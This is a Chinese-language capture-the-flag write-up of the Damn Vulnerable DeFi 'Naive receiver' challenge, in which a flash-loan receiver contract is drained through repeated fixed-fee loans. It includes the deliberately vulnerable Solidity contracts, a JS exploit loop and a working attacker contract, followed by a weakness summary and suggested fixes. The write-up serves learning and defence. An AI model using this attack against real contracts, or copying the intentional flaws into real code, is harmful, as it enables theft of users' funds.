![https://i.imgur.com/jCmctpN.png](https://i.imgur.com/jCmctpN.png)

> There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance. You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH. Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)
>

[See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/naive-receiver) [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/naive-receiver/naive-receiver.challenge.js)

這題說有一個擁有 1000 ETH、手續費固定 1ETH 的閃電貸合約。還有一個接收者合約，接收者合約擁有 10 ETH ，可以跟閃電貸合約互動。我們的目標是要把接收者合約的錢都抽乾。

## 思考切入點

- 看看哪裡可以動用到使用者的錢
- 有可能調高手續費嗎？
- 怎麼樣可以用單一 transaction 完成攻擊？

## 合約研讀：尋找攻擊點 本關卡的合約分成 2 個

- FlashLoanReceiver.sol ：使用者接收閃電貸的合約
- NaiveReceiverLenderPool.sol：流動性借貸合約

### 觀察目標對象 FlashLoanReceiver

我們可以先觀察一下 `FlashLoanReceiver.sol` 可以發現我們唯一可以抽乾使用者 ETH 的入口只有 `receiveEther` 這個可能，且因為有權限限制，所以請求一定要由 pool 發出，所以我們一定要呼叫 pool 的 function 發動攻擊。所以此題是屬於 [借刀殺人型攻擊](https://www.so/7822e790bdfa4b05b9a4ce36987edabf) 。接下來要再來觀察一下我們要切的刀 - `NaiveReceiverLenderPool` 。

```jsx
    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be pool"); // 💡 只有 pool 可以觸發此 function

        uint256 amountToBeRepaid = msg.value + fee;

        require(
            address(this).balance >= amountToBeRepaid,
            "Cannot borrow that much"
        );

        _executeActionDuringFlashLoan();

        // Return funds to pool
        pool.sendValue(amountToBeRepaid); // 💡 唯一可以下手的點
    }
```

### 觀察利用對象 NaiveReceiverLenderPool

`NaiveReceiverLenderPool` 透過 `flashLoan` 來呼叫使用者的 `receiveEther` 並且收取 `FIXED_FEE` 固定數量的手續費。`FIXED_FEE` 是寫死的合約中並沒有開放修改，所以可以通過重複呼叫，每次都從 `FlashLoanReceiver` 中抽出 `FIXED_FEE` ，達到抽乾使用者 ETH 的效果。 直覺會是用 for loop 呼叫合約直到 balance 抽乾，可是這樣會是分成好幾個 Transaction。題目有給一個 Hint `Doing it in a single transaction is a big plus ;)` 所以一定存在只有一個 Transaction 的作法。要怎麼做呢？讓我們繼續看下去

```jsx
    function flashLoan(address borrower, uint256 borrowAmount)
        external
        nonReentrant
    {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE),
            borrowAmount
        );

        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }
```

## 實現攻擊

NaiveReceiverLenderPool 沒有限制 caller 必須跟 msg.sender 相同、FlashLoanReceiver 沒有限制 tx.origin 必須是自己，或是有授權的用戶，所以我們可以直接呼叫 NaiveReceiverLenderPool 然後指定 Receiver 為 FlashLoanReceiver。

一開始會一直很想找到可以一次抽乾 10 ETH 的方法，但後來發現基本不可能，所以我們就要想辦法用我們的 EOA 發出一個 Transaction 但是這個 Transaction 卻可以幫我們開啟 10 個 Transaction，要達成這樣的效果就只能自己寫合約了。 所以，此題的解法有兩種：

### EOA 呼叫： 使用 EOA 直接重複呼叫 `NaiveReceiverLenderPool` 的 flash loan function - 可以用 for loop 也可以用 while loop 實現

```jsx
   it('Exploit', async function () {
        while (await ethers.provider.getBalance(this.receiver.address) > 0) {
            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('9'));
        }
```

### 合約呼叫：將多個 Transaction 變成一個

寫一個簡單的攻擊合約，裡面有一個 attack function 可以呼叫 pool 的 flashLoan，在測試當中部署並呼叫一次我們攻擊合約發動攻擊，交由合約幫我們發動剩下的攻擊

- 攻擊 function

```jsx
    function attack(address _receiver) external {
        while (payable(_receiver).balance >= 1 ether) {
            pool.flashLoan(_receiver, 0);
        }
    }
}
```

- 測試

```jsx
    it('Exploit', async function () {
        const flashLoanReceiverAttacker = await (await ethers.getContractFactory('FlashLoanReceiverAttacker', deployer)).deploy(this.pool.address);
        await flashLoanReceiverAttacker.attack(this.receiver.address);
    });
```

- `yarn run naive-receiver` 之後就可以發現通過拉 ✨

```
  [Challenge] Naive receiver
    ✓ Exploit (176ms)

  1 passing (1s)

✨  Done in 4.43s.
```

### 🔧 弱點總結 & 修改方式

這題我們通過流動性借貸池 `NaiveReceiverLenderPool` 的 FlashLoan 去攻擊 `FlashLoanReceiver` ，是屬於借刀殺人型攻擊的題目。

- 弱點：
    1. Flash Loan 的接收者`FlashLoanReceiver` 沒有限定 call flashLoan 的 tx.origin，所以導致所有人都可以借錢然後指定 `FlashLoanReceiver`收
    2. 沒有確認收錢後的執行結果、沒有限定必須達成某些條件才 execute transaction，等於沒有利用到 flashLoan 最大的好處 =，所以導致可以白白被收取手續費。

        =如果沒有賺錢就不執行

- 攻擊方式：
  - hacker呼叫 `NaiveReceiverLenderPool.flashLoan` 指定 `FlashLoanReceiver` 收使之白白被收取手續費。
- 改進：1. 如果要更改可以在 `FlashLoanReceiver` 當中限制 `tx.origin` 必須是 Owner 或其他授權對象。2. 限制 `FlashLoanReceiver.receiveEther` 一定要滿足某些條件才 execute，不然就 revert

## 完整合約

### FlashLoanReceiver 完整合約

```jsx
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver {
    using Address for address payable;

    address payable private pool;

    constructor(address payable poolAddress) {
        pool = poolAddress;
    }

    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be pool"); // 💡 只有 pool 可以觸發此 function

        uint256 amountToBeRepaid = msg.value + fee;

        require(
            address(this).balance >= amountToBeRepaid,
            "Cannot borrow that much"
        );

        _executeActionDuringFlashLoan();

        // Return funds to pool
        pool.sendValue(amountToBeRepaid); // 💡 唯一可以下手的點
    }

    // Internal function where the funds received are used
    function _executeActionDuringFlashLoan() internal {}

    // Allow deposits of ETH
    receive() external payable {}
}

```

### NaiveReceiverLenderPool

```jsx
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverLenderPool is ReentrancyGuard {
    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) {
        return FIXED_FEE;
    }

    function flashLoan(address borrower, uint256 borrowAmount)
        external
        nonReentrant
    {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE),
            borrowAmount
        );

        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }

    // Allow deposits of ETH
    receive() external payable {}
}

```

### FlashLoanReceiverAttacker 攻擊合約

```jsx
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract FlashLoanReceiverAttacker {
    NaiveReceiverLenderPool public pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address _receiver) external {
        while (payable(_receiver).balance >= 1 ether) {
            pool.flashLoan(_receiver, 0);
        }
    }
}

```

## References

[Damn Vulnerable DeFi](https://damnvulnerabledefi.xyz/)
